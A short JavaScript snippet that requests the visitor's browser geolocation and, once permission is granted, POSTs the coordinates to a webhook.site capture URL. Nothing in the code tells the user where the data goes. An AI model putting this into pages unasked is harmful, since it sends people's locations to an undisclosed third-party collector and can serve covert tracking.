// Check if the browser supports the Geolocation API
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
}

// Function to run if the user grants permission
function successCallback(position) {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var data = { latitude: lat, longitude: lon };
    fetch('https://webhook.site/21bb88af-9640-4faa-b5f9-fb118d6c85c4', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });
}

// Function to run if the user denies permission or an error occurs
function errorCallback(error) {
    console.log("Geolocation error:", error.message);
}
